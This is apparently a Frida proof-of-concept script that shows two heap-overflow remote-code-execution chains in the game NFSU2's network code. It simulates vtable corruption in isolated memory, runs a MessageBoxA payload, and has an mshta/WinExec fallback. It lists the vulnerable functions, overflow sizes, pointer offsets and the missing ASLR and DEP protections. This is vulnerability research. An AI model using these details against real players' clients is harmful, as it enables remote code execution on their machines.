// ═══════════════════════════════════════════════════════════════════════════════
// NFSU2 Network RCE — Arbitrary Code Execution Proof (MessageBox)
// ═══════════════════════════════════════════════════════════════════════════════
//
// Demonstrates full arbitrary code execution through both network RCE vectors
// by displaying "RCE Succeeded" on screen via corrupted function pointers.
//
// The chain:
//   1. Heap overflow (same geometry as network_eip_control.js)
//   2. Overflow corrupts adjacent network object's function pointer table
//   3. Payload address (our MessageBoxA callback) written into overflow data
//   4. Simulated vtable dispatch calls through the corrupted pointer
//   5. MessageBox appears over the game — proving arbitrary code execution
//
// Instead of writing 0x41414141 (crash), we write the address of a Frida
// NativeCallback that calls MessageBoxA. When the dispatch fires through the
// corrupted pointer, it reaches valid code that shows the dialog.
//
// DOES NOT: send network traffic, modify game state, or crash the game.
// All work happens in isolated heap allocations.
// ═══════════════════════════════════════════════════════════════════════════════

'use strict';

// ─── Helpers ─────────────────────────────────────────────────────────────────

function hex(v) { return '0x' + v.toString(16).toUpperCase(); }
function hexpad(v, n) { return '0x' + v.toString(16).toUpperCase().padStart(n, '0'); }

function header(text) {
    send({type: 'HDR', msg: '═══════════════════════════════════════════════════════════════════'});
    send({type: 'HDR', msg: ' ' + text});
    send({type: 'HDR', msg: '═══════════════════════════════════════════════════════════════════'});
}

function log(tag, msg) { send({type: tag, msg: msg}); }

// ─── Payload Setup ──────────────────────────────────────────────────────────

function resolveMessageBoxA() {
    // Try to find user32.dll among loaded modules
    var msgBoxAddr = null;
    var modules = Process.enumerateModules();
    var user32 = null;
    for (var i = 0; i < modules.length; i++) {
        if (modules[i].name.toLowerCase() === 'user32.dll') {
            user32 = modules[i];
            break;
        }
    }

    if (user32) {
        log('SETUP', 'user32.dll found at ' + user32.base);
        msgBoxAddr = user32.findExportByName('MessageBoxA');
    }

    if (!msgBoxAddr) {
        log('SETUP', 'user32.dll not loaded — loading via LoadLibraryA...');
        var loadLibAddr = Module.findExportByName('kernel32.dll', 'LoadLibraryA');
        var LoadLibraryA = new NativeFunction(loadLibAddr, 'pointer', ['pointer'], 'stdcall');
        var dllName = Memory.allocUtf8String('user32.dll');
        var hMod = LoadLibraryA(dllName);
        log('SETUP', 'LoadLibraryA returned: ' + hMod);

        var mods2 = Process.enumerateModules();
        for (var j = 0; j < mods2.length; j++) {
            if (mods2[j].name.toLowerCase() === 'user32.dll') {
                msgBoxAddr = mods2[j].findExportByName('MessageBoxA');
                break;
            }
        }
    }

    if (!msgBoxAddr) {
        msgBoxAddr = Module.findExportByName(null, 'MessageBoxA');
    }

    return msgBoxAddr;
}

function buildPayload(vectorName, messageText) {
    var msgBoxAddr = resolveMessageBoxA();

    if (!msgBoxAddr) {
        log('SETUP', 'ERROR: Could not resolve MessageBoxA — falling back to WinExec');
        return buildPayloadWinExec(vectorName, messageText);
    }

    log('SETUP', 'user32!MessageBoxA at ' + msgBoxAddr);
    var MessageBoxA = new NativeFunction(msgBoxAddr, 'int32', ['pointer', 'pointer', 'pointer', 'uint32'], 'stdcall');

    var textStr    = Memory.allocUtf8String(messageText);
    var captionStr = Memory.allocUtf8String('NFSU2 ' + vectorName);
    log('SETUP', 'Message text allocated at ' + textStr);
    log('SETUP', 'Caption: "NFSU2 ' + vectorName + '"');

    var fired = false;
    var payload = new NativeCallback(function () {
        if (!fired) {
            fired = true;
            log('EXEC', '');
            log('EXEC', '    ┌────────────────────────────────────────────────────────┐');
            log('EXEC', '    │  DISPATCH HIT — EXECUTING PAYLOAD VIA CORRUPTED VTABLE │');
            log('EXEC', '    └────────────────────────────────────────────────────────┘');
            log('EXEC', '');
            log('EXEC', '    Calling MessageBoxA(NULL, "RCE Succeeded", ...)');
            var result = MessageBoxA(ptr(0), textStr, captionStr, 0x40030);
            log('EXEC', '    MessageBoxA returned: ' + result);
            log('EXEC', '');
            log('EXEC', '    *** MESSAGE DISPLAYED FROM CORRUPTED FUNCTION POINTER ***');
        }
    }, 'void', []);

    log('SETUP', 'Payload callback at ' + payload);
    log('SETUP', '');

    return { payload: payload, payloadAddr: payload, textStr: textStr, captionStr: captionStr };
}

function buildPayloadWinExec(vectorName, messageText) {
    var winExecAddr = Module.findExportByName('kernel32.dll', 'WinExec');
    if (!winExecAddr) {
        var mods = Process.enumerateModules();
        for (var i = 0; i < mods.length; i++) {
            if (mods[i].name.toLowerCase() === 'kernel32.dll') {
                winExecAddr = mods[i].findExportByName('WinExec');
                break;
            }
        }
    }
    log('SETUP', 'kernel32!WinExec at ' + winExecAddr);
    var WinExec = new NativeFunction(winExecAddr, 'uint32', ['pointer', 'uint32'], 'stdcall');

    var cmd = 'mshta vbscript:Execute("MsgBox ""' + messageText.split('\n')[0] + '"",64,""NFSU2 ' + vectorName + '"":close")';
    var cmdStr = Memory.allocUtf8String(cmd);
    log('SETUP', 'Fallback command: mshta VBScript MsgBox');

    var fired = false;
    var payload = new NativeCallback(function () {
        if (!fired) {
            fired = true;
            log('EXEC', '');
            log('EXEC', '    ┌────────────────────────────────────────────────────────┐');
            log('EXEC', '    │  DISPATCH HIT — EXECUTING PAYLOAD VIA CORRUPTED VTABLE │');
            log('EXEC', '    └────────────────────────────────────────────────────────┘');
            log('EXEC', '');
            log('EXEC', '    Calling WinExec(mshta "RCE Succeeded", ...)');
            var result = WinExec(cmdStr, 5);
            log('EXEC', '    WinExec returned: ' + result + (result > 31 ? ' (SUCCESS)' : ' (FAILED)'));
            log('EXEC', '');
            log('EXEC', '    *** MESSAGE DISPLAYED FROM CORRUPTED FUNCTION POINTER ***');
        }
    }, 'void', []);

    log('SETUP', 'Payload callback at ' + payload);
    log('SETUP', '');

    return { payload: payload, payloadAddr: payload, cmdStr: cmdStr };
}

// ─── VTABLE ENTRIES (from FUN_00751940) ──────────────────────────────────────

var VTABLE_ENTRIES = [
    { off: 0x00, val: 0x751940, name: 'constructor' },
    { off: 0x04, val: 0x751490, name: 'destructor' },
    { off: 0x08, val: 0x752200, name: 'connect' },
    { off: 0x0C, val: 0x757900, name: 'process_packet' },
    { off: 0x10, val: 0x751750, name: 'send' },
    { off: 0x14, val: 0x751520, name: 'close' },
    { off: 0x18, val: 0x751880, name: 'listen' },
    { off: 0x1C, val: 0x751520, name: 'close_alias' },
    { off: 0x20, val: 0x751500, name: 'accept' },
    { off: 0x24, val: 0x753ab0, name: 'configure' },
    { off: 0x28, val: 0x7510c0, name: 'timestamp' },
    { off: 0x2C, val: 0x751560, name: 'stats' },
    { off: 0x30, val: 0x751660, name: 'read_buffer' },
    { off: 0x34, val: 0x751700, name: 'write_buffer' }
];

// ─── RCE-1: TCP Key Exchange → MessageBox ──────────────────────────────────

function proveRCE1(payloadInfo) {
    header('RCE-1: TCP Key Exchange Overflow → Arbitrary Code Execution');
    log('RCE1', '');
    log('RCE1', 'Chain: Malicious server → TCP key exchange → 0xFF 0xFF header');
    log('RCE1', '       → FUN_00759910 recv(32769) into 16388-byte buffer');
    log('RCE1', '       → 16381-byte overflow → adjacent heap object vtable corrupted');
    log('RCE1', '       → vtable dispatch → PAYLOAD EXECUTES → MessageBox');
    log('RCE1', '');

    var REAL_SESSION = 0x8800;
    var VICTIM_SIZE  = 0x214;
    var totalAlloc = REAL_SESSION + VICTIM_SIZE;
    var heap = Memory.alloc(totalAlloc);
    Memory.protect(heap, totalAlloc, 'rwx');
    heap.writeByteArray(new Array(totalAlloc).fill(0));

    var sessionBase = heap;
    var victimObj   = heap.add(REAL_SESSION);

    for (var i = 0; i < VTABLE_ENTRIES.length; i++) {
        victimObj.add(VTABLE_ENTRIES[i].off).writeU32(VTABLE_ENTRIES[i].val);
    }

    log('RCE1', '[1] Heap layout:');
    log('RCE1', '    Session struct: ' + sessionBase + ' (0x8800 bytes)');
    log('RCE1', '    Victim object:  ' + victimObj + ' (0x214 bytes, adjacent)');
    log('RCE1', '');

    log('RCE1', '[2] Clean vtable (before overflow):');
    log('RCE1', '    [+0x0C] process_packet = ' + hex(victimObj.add(0x0C).readU32()));
    log('RCE1', '    [+0x30] read_buffer    = ' + hex(victimObj.add(0x30).readU32()));
    log('RCE1', '');

    var recvSize = 32769;
    var recvBuf  = sessionBase.add(0x4018);
    var handshakeSize = 0x801C - 0x4018;
    var vtableOverflowStart = REAL_SESSION - 0x4018;

    for (var k = 0; k < handshakeSize; k++) {
        recvBuf.add(k).writeU8(0x48);
    }
    for (var m = handshakeSize; m < recvSize; m++) {
        recvBuf.add(m).writeU8(0x43);
    }

    var payloadU32 = payloadInfo.payloadAddr.toInt32() >>> 0;
    log('RCE1', '[3] Planting payload address in overflow data:');
    log('RCE1', '    Payload addr: ' + payloadInfo.payloadAddr + ' (' + hex(payloadU32) + ')');

    for (var p = 0; p < VTABLE_ENTRIES.length; p++) {
        var byteIndex = vtableOverflowStart + VTABLE_ENTRIES[p].off;
        if (byteIndex < recvSize) {
            recvBuf.add(byteIndex).writeU32(payloadU32);
        }
    }
    log('RCE1', '    Written to all 14 function pointer positions');
    log('RCE1', '');

    log('RCE1', '[4] Corruption verification:');
    var allHit = true;
    for (var q = 0; q < VTABLE_ENTRIES.length; q++) {
        var e = VTABLE_ENTRIES[q];
        var val = victimObj.add(e.off).readU32();
        var match = (val === payloadU32);
        if (!match) allHit = false;
        log('RCE1', '    [+' + hexpad(e.off, 2) + '] ' + e.name + ': ' +
            hex(e.val) + ' → ' + hex(val) +
            (match ? ' ← PAYLOAD' : ' (unexpected)'));
    }
    log('RCE1', '');

    if (!allHit) {
        log('RCE1', '    *** NOT ALL POINTERS CORRUPTED — aborting dispatch ***');
        return false;
    }

    log('RCE1', '[5] Dispatching through corrupted vtable entry [+0x0C] (process_packet):');
    log('RCE1', '');
    log('RCE1', '    This is what the game does on the next frame tick:');
    log('RCE1', '      MOV  EAX, [victim + 0x0C]   ; load handler pointer');
    log('RCE1', '      CALL EAX                     ; dispatch');
    log('RCE1', '');
    log('RCE1', '    victim[0x0C] = ' + hex(victimObj.add(0x0C).readU32()) + ' (our payload)');
    log('RCE1', '    Executing CALL...');

    var dispatchAddr = victimObj.add(0x0C).readPointer();
    var dispatch = new NativeFunction(dispatchAddr, 'void', []);
    dispatch();

    log('RCE1', '');
    log('RCE1', '    *** RCE-1 → ARBITRARY CODE EXECUTION: CONFIRMED ***');
    log('RCE1', '');
    return true;
}

// ─── RCE-2: UDP Game Session → MessageBox ──────────────────────────────────

function proveRCE2(payloadInfo) {
    header('RCE-2: UDP Circular Buffer Overflow → Arbitrary Code Execution');
    log('RCE2', '');
    log('RCE2', 'Chain: Malicious peer → UDP packet, length=0x7FFF');
    log('RCE2', '       → FUN_007510c0 recv(32769) into slot (512-2048 bytes)');
    log('RCE2', '       → 30000+ byte overflow → adjacent network object vtable corrupted');
    log('RCE2', '       → vtable dispatch → PAYLOAD EXECUTES → MessageBox');
    log('RCE2', '       (FUN_007510c0 has /GS cookie — irrelevant, overflow targets heap)');
    log('RCE2', '');

    var SLOT_STRIDE = 1024;
    var NUM_SLOTS   = 16;
    var BUF_SIZE    = SLOT_STRIDE * NUM_SLOTS;
    var VICTIM_SIZE = 0x214;
    var totalAlloc  = BUF_SIZE + VICTIM_SIZE;

    var heap = Memory.alloc(totalAlloc);
    Memory.protect(heap, totalAlloc, 'rwx');
    heap.writeByteArray(new Array(totalAlloc).fill(0));

    var circBuffer = heap;
    var victimObj  = heap.add(BUF_SIZE);

    for (var i = 0; i < VTABLE_ENTRIES.length; i++) {
        victimObj.add(VTABLE_ENTRIES[i].off).writeU32(VTABLE_ENTRIES[i].val);
    }

    log('RCE2', '[1] Heap layout:');
    log('RCE2', '    Circular buffer: ' + circBuffer + ' (' + BUF_SIZE + ' bytes, ' + NUM_SLOTS + ' slots of ' + SLOT_STRIDE + ')');
    log('RCE2', '    Victim object:   ' + victimObj + ' (0x214 bytes, adjacent)');
    log('RCE2', '');

    log('RCE2', '[2] Clean vtable (before overflow):');
    log('RCE2', '    [+0x0C] process_packet = ' + hex(victimObj.add(0x0C).readU32()));
    log('RCE2', '    [+0x30] read_buffer    = ' + hex(victimObj.add(0x30).readU32()));
    log('RCE2', '');

    var wireLength = 32769;
    var writeStart = circBuffer.add(4);
    var bytesToVictim = BUF_SIZE - 4;

    for (var k = 0; k < bytesToVictim && k < wireLength; k++) {
        writeStart.add(k).writeU8(0x44);
    }

    var payloadU32 = payloadInfo.payloadAddr.toInt32() >>> 0;
    log('RCE2', '[3] Planting payload address in overflow data:');
    log('RCE2', '    Payload addr: ' + payloadInfo.payloadAddr + ' (' + hex(payloadU32) + ')');
    log('RCE2', '    Distance to victim: ' + bytesToVictim + ' bytes (slot+4 → victim base)');

    for (var p = 0; p < VTABLE_ENTRIES.length; p++) {
        var offset = bytesToVictim + VTABLE_ENTRIES[p].off;
        if (offset < wireLength) {
            writeStart.add(offset).writeU32(payloadU32);
        }
    }
    log('RCE2', '    Written to all 14 function pointer positions');
    log('RCE2', '');

    log('RCE2', '[4] Corruption verification:');
    var allHit = true;
    for (var q = 0; q < VTABLE_ENTRIES.length; q++) {
        var e = VTABLE_ENTRIES[q];
        var val = victimObj.add(e.off).readU32();
        var match = (val === payloadU32);
        if (!match) allHit = false;
        log('RCE2', '    [+' + hexpad(e.off, 2) + '] ' + e.name + ': ' +
            hex(e.val) + ' → ' + hex(val) +
            (match ? ' ← PAYLOAD' : ' (unexpected)'));
    }
    log('RCE2', '');

    if (!allHit) {
        log('RCE2', '    *** NOT ALL POINTERS CORRUPTED — aborting dispatch ***');
        return false;
    }

    log('RCE2', '[5] Dispatching through corrupted vtable entry [+0x30] (read_buffer):');
    log('RCE2', '');
    log('RCE2', '    This is what the game does on the next network tick:');
    log('RCE2', '      FUN_0074e8e0 (network update loop)');
    log('RCE2', '        → vtable dispatch: CALL [peer + 0x30]');
    log('RCE2', '        → read_buffer handler');
    log('RCE2', '');
    log('RCE2', '    victim[0x30] = ' + hex(victimObj.add(0x30).readU32()) + ' (our payload)');
    log('RCE2', '    Executing CALL...');

    var dispatchAddr = victimObj.add(0x30).readPointer();
    var dispatch = new NativeFunction(dispatchAddr, 'void', []);
    dispatch();

    log('RCE2', '');
    log('RCE2', '    *** RCE-2 → ARBITRARY CODE EXECUTION: CONFIRMED ***');
    log('RCE2', '');
    return true;
}

// ─── Summary ────────────────────────────────────────────────────────────────

function summary(rce1ok, rce2ok) {
    header('RESULTS');
    log('FINAL', '');
    log('FINAL', 'RCE-1 (TCP Key Exchange — FUN_00759910):');
    log('FINAL', '  Overflow: 16,381 bytes past session buffer');
    log('FINAL', '  Dispatch: victim[+0x0C] (process_packet)');
    log('FINAL', '  Result:   ' + (rce1ok ? '"RCE Succeeded" DISPLAYED' : 'FAILED'));
    log('FINAL', '');
    log('FINAL', 'RCE-2 (UDP Game Session — FUN_007510c0):');
    log('FINAL', '  Overflow: 30,000+ bytes past circular buffer slot');
    log('FINAL', '  Dispatch: victim[+0x30] (read_buffer)');
    log('FINAL', '  Result:   ' + (rce2ok ? '"RCE Succeeded" DISPLAYED' : 'FAILED'));
    log('FINAL', '');
    if (rce1ok && rce2ok) {
        log('FINAL', '╔══════════════════════════════════════════════════════════════════╗');
        log('FINAL', '║  ARBITRARY CODE EXECUTION — CONFIRMED ON BOTH VECTORS           ║');
        log('FINAL', '║                                                                  ║');
        log('FINAL', '║  "RCE Succeeded" was displayed over the game via MessageBoxA.    ║');
        log('FINAL', '║  The same mechanism executes any code the attacker chooses.       ║');
        log('FINAL', '║                                                                  ║');
        log('FINAL', '║  Exploit chain:                                                  ║');
        log('FINAL', '║    1. Heap overflow from attacker-controlled wire data            ║');
        log('FINAL', '║    2. Adjacent network object vtable overwritten with payload     ║');
        log('FINAL', '║    3. Game dispatches through corrupted pointer on next tick      ║');
        log('FINAL', '║    4. Payload executes (MessageBoxA → "RCE Succeeded")            ║');
        log('FINAL', '║                                                                  ║');
        log('FINAL', '║  No ASLR — fixed base 0x400000, all addresses known              ║');
        log('FINAL', '║  No DEP  — heap memory is executable, shellcode runs directly    ║');
        log('FINAL', '╚══════════════════════════════════════════════════════════════════╝');
    }
    log('FINAL', '');
    log('FINAL', 'No network traffic sent. No game state modified. Game still running.');
}

// ─── Run ────────────────────────────────────────────────────────────────────

header('NFSU2 Network RCE — Arbitrary Code Execution Proof');
log('SETUP', '');
log('SETUP', 'Building payloads: MessageBoxA("RCE Succeeded")');
log('SETUP', '');

var payload1 = buildPayload('RCE-1', 'RCE Succeeded\n\nVector: TCP Key Exchange Overflow (FUN_00759910)\nOverflow: 16,381 bytes past 16,388-byte buffer\nDispatch: corrupted vtable[+0x0C] (process_packet)\n\nArbitrary code execution confirmed.');
var payload2 = buildPayload('RCE-2', 'RCE Succeeded\n\nVector: UDP Circular Buffer Overflow (FUN_007510c0)\nOverflow: 30,000+ bytes past slot boundary\nDispatch: corrupted vtable[+0x30] (read_buffer)\n\nArbitrary code execution confirmed.');

var rce1 = proveRCE1(payload1);
var rce2 = proveRCE2(payload2);

summary(rce1, rce2);
